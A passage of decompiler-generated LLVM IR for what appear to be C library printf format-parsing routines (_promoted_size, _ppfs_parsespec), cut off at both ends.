  %v2_8052eda = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052eda, i32* @ebx, align 4
  ret i32 %v0_8052edc

; uselistorder directives
  uselistorder i32 %v3_8052eb5, { 1, 0 }
  uselistorder i32 %v3_8052e9e, { 1, 0 }
  uselistorder i32 %v1_8052e89, { 2, 1, 0 }
  uselistorder i32 %v1_8052e8a, { 1, 2, 0 }
  uselistorder i32 %v3_8052e20, { 1, 0, 2 }
  uselistorder i32* %v2_8052e20, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8052e1b, { 1, 0 }
  uselistorder i32 %v6_8052e17, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_8052e1721, { 1, 0 }
  uselistorder i32 %v1_8052e8a15, { 2, 0, 1 }
  uselistorder i1 %v1_8052e98, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_8052eda, { 1, 0 }
  uselistorder label %dec_label_pc_8052ebf, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ea8, { 1, 0 }
  uselistorder label %dec_label_pc_8052e89, { 1, 0 }
  uselistorder label %dec_label_pc_8052e86, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052e7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052e17, { 1, 0 }
  uselistorder label %dec_label_pc_8052e13, { 1, 0 }
  uselistorder label %dec_label_pc_8052df9, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8052ee0 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8052ee7

dec_label_pc_8052ee7:                             ; preds = %dec_label_pc_8052ee7, %entry
  %v0_8052ee7 = phi i32 [ ptrtoint (i8** @global_var_805c18a.492 to i32), %entry ], [ %v1_8052ee7, %dec_label_pc_8052ee7 ]
  %v1_8052ee7 = add i32 %v0_8052ee7, -2
  %v1_8052eea = inttoptr i32 %v1_8052ee7 to i16*
  %v2_8052eea = load i16, i16* %v1_8052eea, align 2
  %v3_8052eea = sext i16 %v2_8052eea to i32
  %v12_8052eed = icmp ne i32 %v3_8052eea, %v0_8052ee0
  %v6_8052ef7 = icmp ugt i32 %v1_8052ee7, ptrtoint (i32* @global_var_805c172.493 to i32)
  %or.cond = and i1 %v6_8052ef7, %v12_8052eed
  br i1 %or.cond, label %dec_label_pc_8052ee7, label %dec_label_pc_8052ef9

dec_label_pc_8052ef9:                             ; preds = %dec_label_pc_8052ee7
  %.pre = add i32 %v0_8052ee7, -134594932
  %v2_8052eff = sdiv i32 %.pre, 2
  store i32 %v2_8052eff, i32* @edx, align 4
  %v1_8052f01 = add i32 %v2_8052eff, ptrtoint (i8** @global_var_805c18a.492 to i32)
  %v2_8052f01 = inttoptr i32 %v1_8052f01 to i8*
  %v3_8052f01 = load i8, i8* %v2_8052f01, align 1
  %v4_8052f01 = zext i8 %v3_8052f01 to i32
  ret i32 %v4_8052f01

; uselistorder directives
  uselistorder i32 %v2_8052eff, { 1, 0 }
  uselistorder i32 %v1_8052ee7, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805c18a.492 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052f0a = load i32, i32* @edi, align 4
  %v0_8052f0b = load i32, i32* @esi, align 4
  %v0_8052f0c = load i32, i32* @ebx, align 4
  store i32 %v0_8052f0c, i32* %stack_var_-16, align 4
  %v4_8052f0c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8052f38 = add i32 %tmp76, 24
  %v2_8052f38 = inttoptr i32 %v1_8052f38 to i32*
  %v3_8052f38 = load i32, i32* %v2_8052f38, align 4
  store i32 %v3_8052f38, i32* %eax.global-to-local, align 4
  %v1_8052f3f = add i32 %tmp76, 16
  %v2_8052f3f = inttoptr i32 %v1_8052f3f to i32*
  %v3_8052f3f = load i32, i32* %v2_8052f3f, align 4
  %v1_8052f42 = and i32 %v3_8052f3f, 128
  %v2_8052f42 = icmp eq i32 %v1_8052f42, 0
  store i32 %v1_8052f42, i32* %edi.global-to-local, align 4
  %v1_8052f48 = icmp eq i1 %v2_8052f42, false
  br i1 %v1_8052f48, label %dec_label_pc_8052f5b, label %dec_label_pc_8052f4a

dec_label_pc_8052f4a:                             ; preds = %entry
  %v2_8052f4a = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8052fa8.outer

dec_label_pc_8052f55:                             ; preds = %dec_label_pc_80530e3
  %v1_8052f55 = add i32 %v0_80530e3.pre.pre, 1
  store i32 %v1_8052f55, i32* @esi, align 4
  br label %dec_label_pc_80530f3

dec_label_pc_8052f5b:                             ; preds = %entry
  %v15_8052f0d = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052f5d

dec_label_pc_8052f5d:                             ; preds = %dec_label_pc_8052f85.dec_label_pc_8052f5d_crit_edge, %dec_label_pc_8052f5b
  %v2_8052f6e = phi i32 [ %v2_8052f6e.pre, %dec_label_pc_8052f85.dec_label_pc_8052f5d_crit_edge ], [ %v15_8052f0d, %dec_label_pc_8052f5b ]
  %v3_8052f6e = phi i32 [ %v1_8052f85, %dec_label_pc_8052f85.dec_label_pc_8052f5d_crit_edge ], [ 0, %dec_label_pc_8052f5b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8052f61 = mul i32 %v3_8052f6e, 4
  store i32 %v1_8052f61, i32* @ecx, align 4
  %v2_8052f68 = load i32, i32* %arg1, align 4
  store i32 %v2_8052f68, i32* @edx, align 4
  %v2_8052f6a = add i32 %v1_8052f61, -4
  %v3_8052f6a = add i32 %v2_8052f6a, %v2_8052f68
  %v4_8052f6a = inttoptr i32 %v3_8052f6a to i32*
  %v5_8052f6a = load i32, i32* %v4_8052f6a, align 4
  store i32 %v5_8052f6a, i32* %eax.global-to-local, align 4
  %v1_8052f6e = trunc i32 %v5_8052f6a to i8
  %v4_8052f6e = add i32 %v2_8052f6e, 36
  %v5_8052f6e = add i32 %v4_8052f6e, %v3_8052f6e
  %v6_8052f6e = inttoptr i32 %v5_8052f6e to i8*
  store i8 %v1_8052f6e, i8* %v6_8052f6e, align 1
  %v0_8052f72 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f72 = urem i32 %v0_8052f72, 256
  %v2_8052f72 = load i32, i32* @ebx, align 4
  %v3_8052f72 = and i32 %v2_8052f72, -256
  %v4_8052f72 = or i32 %v3_8052f72, %v1_8052f72
  store i32 %v4_8052f72, i32* @ebx, align 4
  %v1_8052f74 = mul i32 %v0_8052f72, 16777216
  %v2_8052f74 = sdiv i32 %v1_8052f74, 16777216
  store i32 %v2_8052f74, i32* %eax.global-to-local, align 4
  %v1_8052f77 = load i32, i32* @edx, align 4
  %v2_8052f77 = load i32, i32* @ecx, align 4
  %v3_8052f77 = add i32 %v1_8052f77, -4
  %v4_8052f77 = add i32 %v3_8052f77, %v2_8052f77
  %v5_8052f77 = inttoptr i32 %v4_8052f77 to i32*
  %v6_8052f77 = load i32, i32* %v5_8052f77, align 4
  %v17_8052f77 = icmp eq i32 %v2_8052f74, %v6_8052f77
  %v1_8052f7b = icmp eq i1 %v17_8052f77, false
  br i1 %v1_8052f7b, label %dec_label_pc_80532cd, label %dec_label_pc_8052f81

dec_label_pc_8052f81:                             ; preds = %dec_label_pc_8052f5d
  %v3_8052f81 = trunc i32 %v0_8052f72 to i8
  %v4_8052f81 = icmp eq i8 %v3_8052f81, 0
  br i1 %v4_8052f81, label %dec_label_pc_8052f8b, label %dec_label_pc_8052f85

dec_label_pc_8052f85:                             ; preds = %dec_label_pc_8052f81
  %v0_8052f85 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052f85 = add i32 %v0_8052f85, 1
  store i32 %v1_8052f85, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052f85, 32
  br i1 %tmp, label %dec_label_pc_8052f85.dec_label_pc_8052f5d_crit_edge, label %dec_label_pc_8052f8b

dec_label_pc_8052f85.dec_label_pc_8052f5d_crit_edge: ; preds = %dec_label_pc_8052f85
  %v2_8052f6e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052f5d

dec_label_pc_8052f8b:                             ; preds = %dec_label_pc_8052f85, %dec_label_pc_8052f81
  %v2_8052f90 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8052fa8.outer

dec_label_pc_8052fa8.outer:                       ; preds = %dec_label_pc_8052f8b, %dec_label_pc_8052f4a, %dec_label_pc_80530c5
  %v0_8052fb4.ph94 = phi i32 [ %v1_80530c5, %dec_label_pc_80530c5 ], [ %v2_8052f4a, %dec_label_pc_8052f4a ], [ %v2_8052f90, %dec_label_pc_8052f8b ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_80530c5 ], [ %tmp66, %dec_label_pc_8052f4a ], [ %tmp66, %dec_label_pc_8052f8b ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8052f4e, %dec_label_pc_80530c5 ], [ 0, %dec_label_pc_8052f4a ], [ 0, %dec_label_pc_8052f8b ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_80530c5 ], [ %v3_8052f38, %dec_label_pc_8052f4a ], [ %v3_8052f38, %dec_label_pc_8052f8b ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_80530c5 ], [ 0, %dec_label_pc_8052f4a ], [ 0, %dec_label_pc_8052f8b ]
  %v7_8052faf = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8052faf = trunc i64 %v7_8052faf to i32
  %v2_8052fb7 = add i32 %v8_8052faf, 80
  br label %dec_label_pc_8052fa8

dec_label_pc_8052fa8:                             ; preds = %dec_label_pc_8052fa8.outer, %dec_label_pc_8053065
  %v0_8052fb4 = phi i32 [ %v0_8053072, %dec_label_pc_8053065 ], [ %v0_8052fb4.ph94, %dec_label_pc_8052fa8.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8053065 ], [ %stack_var_-32.1.ph, %dec_label_pc_8052fa8.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8053065 ], [ %stack_var_-88.1.ph, %dec_label_pc_8052fa8.outer ]
  store i32 %v0_8052fb4, i32* @edx, align 4
  %v1_8052fa8 = inttoptr i32 %v0_8052fb4 to i8*
  %v2_8052fa8 = load i8, i8* %v1_8052fa8, align 1
  %v11_8052fa8 = icmp eq i8 %v2_8052fa8, 42
  store i32 %v0_8052fb4, i32* @esi, align 4
  %v1_8052fad = icmp eq i1 %v11_8052fa8, false
  br i1 %v1_8052fad, label %dec_label_pc_8052fbf, label %dec_label_pc_8052faf

dec_label_pc_8052faf:                             ; preds = %dec_label_pc_8052fa8
  store i32 %v8_8052faf, i32* %eax.global-to-local, align 4
  %v1_8052fb4 = add i32 %v0_8052fb4, 1
  store i32 %v1_8052fb4, i32* @esi, align 4
  %v0_8052fb7 = load i32, i32* @esp, align 4
  %v3_8052fb7 = add i32 %v2_8052fb7, %v0_8052fb7
  %v4_8052fb7 = inttoptr i32 %v3_8052fb7 to i32*
  store i32 0, i32* %v4_8052fb7, align 4
  %v0_8052fd9.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052fbf

dec_label_pc_8052fbf:                             ; preds = %dec_label_pc_8052fa8, %dec_label_pc_8052faf
  %v0_8052fd9.pre = phi i32 [ %v0_8052fb4, %dec_label_pc_8052fa8 ], [ %v0_8052fd9.pre.pre, %dec_label_pc_8052faf ]
  %v0_8052fbf = load i32, i32* @global_var_805e1e8, align 8
  store i32 %v0_8052fbf, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8052fd9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052fd9

dec_label_pc_8052fc9:                             ; preds = %dec_label_pc_8052fd9
  %v1_8052fc9 = add i32 %v1_8052fd1, -4094
  %v6_8052fc9 = sub i32 4093, %v1_8052fd1
  %v7_8052fc9 = and i32 %v6_8052fc9, %v1_8052fd1
  %v8_8052fc9 = icmp slt i32 %v7_8052fc9, 0
  %v9_8052fc9 = icmp eq i32 %v1_8052fc9, 0
  %v10_8052fc9 = icmp slt i32 %v1_8052fc9, 0
  %v3_8052fcf = icmp eq i1 %v10_8052fc9, %v8_8052fc9
  %v4_8052fcf = icmp eq i1 %v9_8052fc9, false
  %v5_8052fcf = and i1 %v4_8052fcf, %v3_8052fcf
  br i1 %v5_8052fcf, label %dec_label_pc_8052fd8, label %dec_label_pc_8052fd1

dec_label_pc_8052fd1:                             ; preds = %dec_label_pc_8052fc9
  %v3_8052fd1 = mul i32 %v1_8052fd1, 10
  store i32 %v3_8052fd1, i32* %eax.global-to-local, align 4
  %v2_8052fd4 = add i32 %v3_8052fd1, -48
  %v3_8052fd4 = add i32 %v2_8052fd4, %v2_8052fdb
  store i32 %v3_8052fd4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052fd8

dec_label_pc_8052fd8:                             ; preds = %dec_label_pc_8052fc9, %dec_label_pc_8052fd1
  %v0_8052ff332 = phi i32 [ %v1_8052fd1, %dec_label_pc_8052fc9 ], [ %v3_8052fd4, %dec_label_pc_8052fd1 ]
  %v4_8052fd928 = phi i32 [ %v6_8052fd9, %dec_label_pc_8052fc9 ], [ %v3_8052fd1, %dec_label_pc_8052fd1 ]
  %v1_8052fd8 = add i32 %v0_8052fd8, 1
  store i32 %v1_8052fd8, i32* @esi, align 4
  br label %dec_label_pc_8052fd9

dec_label_pc_8052fd9:                             ; preds = %dec_label_pc_8052fbf, %dec_label_pc_8052fd8
  %v1_8052fd1 = phi i32 [ 0, %dec_label_pc_8052fbf ], [ %v0_8052ff332, %dec_label_pc_8052fd8 ]
  %v4_8052fd9 = phi i32 [ %v4_8052fd9.pre, %dec_label_pc_8052fbf ], [ %v4_8052fd928, %dec_label_pc_8052fd8 ]
  %v0_8052fd8 = phi i32 [ %v0_8052fd9.pre, %dec_label_pc_8052fbf ], [ %v1_8052fd8, %dec_label_pc_8052fd8 ]
  %v1_8052fd9 = inttoptr i32 %v0_8052fd8 to i8*
  %v2_8052fd9 = load i8, i8* %v1_8052fd9, align 1
  %v3_8052fd9 = zext i8 %v2_8052fd9 to i32
  %v5_8052fd9 = and i32 %v4_8052fd9, -256
  %v6_8052fd9 = or i32 %v3_8052fd9, %v5_8052fd9
  store i32 %v6_8052fd9, i32* %eax.global-to-local, align 4
  %v2_8052fdb = sext i8 %v2_8052fd9 to i32
  store i32 %v2_8052fdb, i32* @ecx, align 4
  %v2_8052fde = mul nsw i32 %v2_8052fdb, 2
  %v3_8052fde = add i32 %v2_8052fde, %v0_8052fbf
  %v4_8052fde = inttoptr i32 %v3_8052fde to i8*
  %v5_8052fde = load i8, i8* %v4_8052fde, align 1
  %v6_8052fde = and i8 %v5_8052fde, 8
  %v7_8052fde = icmp eq i8 %v6_8052fde, 0
  %v1_8052fe3 = icmp eq i1 %v7_8052fde, false
  br i1 %v1_8052fe3, label %dec_label_pc_8052fc9, label %dec_label_pc_8052fe5

dec_label_pc_8052fe5:                             ; preds = %dec_label_pc_8052fd9
  %v0_8052fe5 = load i32, i32* @edx, align 4
  %v1_8052fe5 = add i32 %v0_8052fe5, -1
  %v2_8052fe5 = inttoptr i32 %v1_8052fe5 to i8*
  %v3_8052fe5 = load i8, i8* %v2_8052fe5, align 1
  %v12_8052fe5 = icmp eq i8 %v3_8052fe5, 37
  %v1_8052fe9 = icmp eq i1 %v12_8052fe5, false
  br i1 %v1_8052fe9, label %dec_label_pc_805307c, label %dec_label_pc_8052fef

dec_label_pc_8052fef:                             ; preds = %dec_label_pc_8052fe5
  %v10_8052fef = icmp eq i8 %v2_8052fd9, 36
  %v1_8052ff1 = icmp eq i1 %v10_8052fef, false
  br i1 %v1_8052ff1, label %dec_label_pc_8053023, label %dec_label_pc_8052ff3

dec_label_pc_8052ff3:                             ; preds = %dec_label_pc_8052fef
  %tmp89 = icmp slt i32 %v1_8052fd1, 1
  br i1 %tmp89, label %dec_label_pc_8053023, label %dec_label_pc_8052ff7

dec_label_pc_8052ff7:                             ; preds = %dec_label_pc_8052ff3
  %v4_8052ff7 = icmp eq i32 %stack_var_-88.1, 0
  %v1_8052ffc = add i32 %v0_8052fd8, 1
  store i32 %v1_8052ffc, i32* @edx, align 4
  br i1 %v4_8052ff7, label %dec_label_pc_80532cd, label %dec_label_pc_8053005

dec_label_pc_8053005:                             ; preds = %dec_label_pc_8052ff7
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_805300d = sub i32 %v1_8052fd1, %stack_var_-88.1
  %v8_805300d = xor i32 %v1_8052fd1, %stack_var_-88.1
  %v9_805300d = xor i32 %v2_805300d, %v1_8052fd1
  %v10_805300d = and i32 %v9_805300d, %v8_805300d
  %v11_805300d = icmp slt i32 %v10_805300d, 0
  %v12_805300d = icmp eq i32 %v2_805300d, 0
  %v13_805300d = icmp slt i32 %v2_805300d, 0
  %v3_805300f = icmp ne i1 %v13_805300d, %v11_805300d
  %v4_805300f = or i1 %v12_805300d, %v3_805300f
  %stack_var_-88.1.v0_8053011 = select i1 %v4_805300f, i32 %stack_var_-88.1, i32 %v1_8052fd1
  br label %dec_label_pc_805301f

dec_label_pc_805301f:                             ; preds = %dec_label_pc_8053033, %dec_label_pc_8053005, %dec_label_pc_8053037
  %v0_805301f = phi i32 [ %v1_8052ffc, %dec_label_pc_8053005 ], [ %v0_8052fe5, %dec_label_pc_8053037 ], [ %v0_8052fe5, %dec_label_pc_8053033 ]
  %stack_var_-32.2 = phi i32 [ %v1_8052fd1, %dec_label_pc_8053005 ], [ %stack_var_-32.1, %dec_label_pc_8053037 ], [ %stack_var_-32.1, %dec_label_pc_8053033 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8053011, %dec_label_pc_8053005 ], [ 0, %dec_label_pc_8053037 ], [ 0, %dec_label_pc_8053033 ]
  store i32 %v0_805301f, i32* @esi, align 4
  br label %dec_label_pc_8053046

dec_label_pc_8053023:                             ; preds = %dec_label_pc_8052ff3, %dec_label_pc_8052fef
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_8053033, label %dec_label_pc_805302a

dec_label_pc_805302a:                             ; preds = %dec_label_pc_8053023
  %v10_805302a = icmp eq i8 %v2_8052fd9, 109
  br i1 %v10_805302a, label %dec_label_pc_805307c, label %dec_label_pc_80532cd

dec_label_pc_8053033:                             ; preds = %dec_label_pc_8053023
  %tmp153 = icmp ugt i32 %v0_8052fd8, %v0_8052fe5
  br i1 %tmp153, label %dec_label_pc_8053037, label %dec_label_pc_805301f

dec_label_pc_8053037:                             ; preds = %dec_label_pc_8053033
  %v1_8053037 = inttoptr i32 %v0_8052fe5 to i8*
  %v2_8053037 = load i8, i8* %v1_8053037, align 1
  %v8_8053037 = icmp eq i8 %v2_8053037, 48
  br i1 %v8_8053037, label %dec_label_pc_805301f, label %dec_label_pc_805307c

dec_label_pc_8053046:                             ; preds = %dec_label_pc_8053057, %dec_label_pc_805301f
  %v0_8053072 = phi i32 [ %v1_8053057, %dec_label_pc_8053057 ], [ %v0_805301f, %dec_label_pc_805301f ]
  %v4_805305035 = phi i32 [ %v6_8053050, %dec_label_pc_8053057 ], [ %v6_8052fd9, %dec_label_pc_805301f ]
  store i32 ptrtoint ([8 x i8]* @global_var_805c16a.494 to i32), i32* %edx.global-to-local, align 4
  %v1_8053053 = inttoptr i32 %v0_8053072 to i8*
  br label %dec_label_pc_8053050

dec_label_pc_8053050:                             ; preds = %dec_label_pc_8053061, %dec_label_pc_8053046
  %v4_8053050 = phi i32 [ %v4_805305035, %dec_label_pc_8053046 ], [ %v6_8053050, %dec_label_pc_8053061 ]
  %v0_8053052 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805c16a.494 to i32), %dec_label_pc_8053046 ], [ %v1_8053052, %dec_label_pc_8053061 ]
  %v0_8053061 = phi i32 [ 1, %dec_label_pc_8053046 ], [ %v2_8053061, %dec_label_pc_8053061 ]
  store i32 %v0_8053061, i32* @ecx, align 4
  %v1_8053050 = inttoptr i32 %v0_8053052 to i8*
  %v2_8053050 = load i8, i8* %v1_8053050, align 1
  %v3_8053050 = zext i8 %v2_8053050 to i32
  %v5_8053050 = and i32 %v4_8053050, -256
  %v6_8053050 = or i32 %v3_8053050, %v5_8053050
  store i32 %v6_8053050, i32* %eax.global-to-local, align 4
  %v1_8053052 = add i32 %v0_8053052, 1
  store i32 %v1_8053052, i32* @edx, align 4
  %v2_8053053 = load i8, i8* %v1_8053053, align 1
  %v15_8053053 = icmp eq i8 %v2_8053053, %v2_8053050
  %v1_8053055 = icmp eq i1 %v15_8053053, false
  br i1 %v1_8053055, label %dec_label_pc_805305c, label %dec_label_pc_8053057

dec_label_pc_8053057:                             ; preds = %dec_label_pc_8053050
  %v1_8053057 = add i32 %v0_8053072, 1
  store i32 %v1_8053057, i32* @esi, align 4
  %v0_8053058 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053058 = or i32 %v0_8053058, %v0_8053061
  store i32 %v2_8053058, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053046

dec_label_pc_805305c:                             ; preds = %dec_label_pc_8053050
  %v1_805305c = inttoptr i32 %v1_8053052 to i8*
  %v2_805305c = load i8, i8* %v1_805305c, align 1
  %v3_805305c = icmp eq i8 %v2_805305c, 0
  br i1 %v3_805305c, label %dec_label_pc_8053065, label %dec_label_pc_8053061

dec_label_pc_8053061:                             ; preds = %dec_label_pc_805305c
  %v2_8053061 = mul i32 %v0_8053061, 2
  br label %dec_label_pc_8053050

dec_label_pc_8053065:                             ; preds = %dec_label_pc_805305c
  %v0_8053065 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053069 = udiv i32 %v0_8053065, 2
  %v1_8053069.not = or i32 %v1_8053069, -6
  %v1_805306e = xor i32 %v1_8053069.not, 5
  store i32 %v1_805306e, i32* %eax.global-to-local, align 4
  %v2_8053070 = and i32 %v1_805306e, %v0_8053065
  store i32 %v2_8053070, i32* %edi.global-to-local, align 4
  %v1_8053072 = add i32 %v0_8053072, -1
  %v2_8053072 = inttoptr i32 %v1_8053072 to i8*
  %v3_8053072 = load i8, i8* %v2_8053072, align 1
  %v12_8053072 = icmp eq i8 %v3_8053072, 37
  %v1_8053076 = icmp eq i1 %v12_8053072, false
  br i1 %v1_8053076, label %dec_label_pc_8052fa8, label %dec_label_pc_805307c

dec_label_pc_805307c:                             ; preds = %dec_label_pc_8053037, %dec_label_pc_8053065, %dec_label_pc_8052fe5, %dec_label_pc_805302a
  %v0_805309f = phi i32 [ %v1_8052fd1, %dec_label_pc_805302a ], [ %v1_8052fd1, %dec_label_pc_8053037 ], [ 0, %dec_label_pc_8053065 ], [ %v1_8052fd1, %dec_label_pc_8052fe5 ]
  %v1_80530a8 = phi i32 [ %v0_8052fd8, %dec_label_pc_805302a ], [ %v0_8052fd8, %dec_label_pc_8053037 ], [ %v0_8053072, %dec_label_pc_8053065 ], [ %v0_8052fd8, %dec_label_pc_8052fe5 ]
  %v0_80530a5 = phi i32 [ %v0_8052fe5, %dec_label_pc_805302a ], [ %v0_8052fe5, %dec_label_pc_8053037 ], [ %v1_8053052, %dec_label_pc_8053065 ], [ %v0_8052fe5, %dec_label_pc_8052fe5 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_805302a ], [ %stack_var_-32.1, %dec_label_pc_8053037 ], [ %stack_var_-32.2, %dec_label_pc_8053065 ], [ %stack_var_-32.1, %dec_label_pc_8052fe5 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_805302a ], [ 0, %dec_label_pc_8053037 ], [ %stack_var_-88.2, %dec_label_pc_8053065 ], [ %stack_var_-88.1, %dec_label_pc_8052fe5 ]
  %v1_805307c = inttoptr i32 %v0_80530a5 to i8*
  %v2_805307c = load i8, i8* %v1_805307c, align 1
  %v11_805307c = icmp eq i8 %v2_805307c, 42
  %v1_805307f = icmp eq i1 %v11_805307c, false
  br i1 %v1_805307f, label %dec_label_pc_80530b5, label %dec_label_pc_8053081

dec_label_pc_8053081:                             ; preds = %dec_label_pc_805307c
  %v4_8053081 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_8053081, label %dec_label_pc_80530a5, label %dec_label_pc_8053088

dec_label_pc_8053088:                             ; preds = %dec_label_pc_8053081
  %v1_8053088 = inttoptr i32 %v1_80530a8 to i8*
  %v2_8053088 = load i8, i8* %v1_8053088, align 1
  %v11_8053088 = icmp eq i8 %v2_8053088, 36
  %v1_805308b = icmp eq i1 %v11_8053088, false
  br i1 %v1_805308b, label %dec_label_pc_80532cd, label %dec_label_pc_8053091

dec_label_pc_8053091:                             ; preds = %dec_label_pc_8053088
  %tmp91 = icmp slt i32 %v0_805309f, 1
  br i1 %tmp91, label %dec_label_pc_80532cd, label %dec_label_pc_8053099

dec_label_pc_8053099:                             ; preds = %dec_label_pc_8053091
  store i32 %v8_8052faf, i32* %eax.global-to-local, align 4
  %v1_805309e = add i32 %v1_80530a8, 1
  store i32 %v1_805309e, i32* @esi, align 4
  %v1_805309f = load i32, i32* @esp, align 4
  %v3_805309f = add i32 %v8_8052faf, 68
  %v4_805309f = add i32 %v3_805309f, %v1_805309f
  %v5_805309f = inttoptr i32 %v4_805309f to i32*
  store i32 %v0_805309f, i32* %v5_805309f, align 4
  %v0_80530e3.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80530b0

dec_label_pc_80530a5:                             ; preds = %dec_label_pc_8053081
  %v1_80530a5 = add i32 %v0_80530a5, 1
  store i32 %v1_80530a5, i32* %eax.global-to-local, align 4
  %v12_80530a8 = icmp eq i32 %v1_80530a5, %v1_80530a8
  %v1_80530aa = icmp eq i1 %v12_80530a8, false
  br i1 %v1_80530aa, label %dec_label_pc_80532cd, label %dec_label_pc_80530b0

dec_label_pc_80530b0:                             ; preds = %dec_label_pc_80530a5, %dec_label_pc_8053099
  %v0_80530e3.pre.pre.pre = phi i32 [ %v1_80530a8, %dec_label_pc_80530a5 ], [ %v0_80530e3.pre.pre.pre.pre, %dec_label_pc_8053099 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530b5

dec_label_pc_80530b5:                             ; preds = %dec_label_pc_805307c, %dec_label_pc_80530b0
  %v0_80530e3.pre.pre = phi i32 [ %v1_80530a8, %dec_label_pc_805307c ], [ %v0_80530e3.pre.pre.pre, %dec_label_pc_80530b0 ]
  %v0_8052f4e = phi i32 [ %v0_805309f, %dec_label_pc_805307c ], [ -2147483648, %dec_label_pc_80530b0 ]
  %v4_80530b5 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_80530b5 = icmp eq i32 %v4_80530b5, 0
  %v1_80530ba = icmp eq i1 %v5_80530b5, false
  %.pre = inttoptr i32 %v0_80530e3.pre.pre to i8*
  br i1 %v1_80530ba, label %dec_label_pc_80530de, label %dec_label_pc_80530c0

dec_label_pc_80530c0:                             ; preds = %dec_label_pc_80530b5
  %v2_80530c0 = load i8, i8* %.pre, align 1
  %v11_80530c0 = icmp eq i8 %v2_80530c0, 46
  %v1_80530c3 = icmp eq i1 %v11_80530c0, false
  br i1 %v1_80530c3, label %dec_label_pc_80530d7, label %dec_label_pc_80530c5

dec_label_pc_80530c5:                             ; preds = %dec_label_pc_80530c0
  %v1_80530c5 = add i32 %v0_80530e3.pre.pre, 1
  store i32 %v1_80530c5, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052fa8.outer

dec_label_pc_80530d7:                             ; preds = %dec_label_pc_80530c0
  br label %dec_label_pc_80530de

dec_label_pc_80530de:                             ; preds = %dec_label_pc_80530b5, %dec_label_pc_80530d7
  %stack_var_-96.2 = phi i32 [ %v0_8052f4e, %dec_label_pc_80530d7 ], [ %stack_var_-96.1.ph, %dec_label_pc_80530b5 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_80530d7 ], [ %v0_8052f4e, %dec_label_pc_80530b5 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805c118.495 to i32), i32* @edx, align 4
  %v4_80530e3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530e3

dec_label_pc_80530e3:                             ; preds = %dec_label_pc_80530ed, %dec_label_pc_80530de
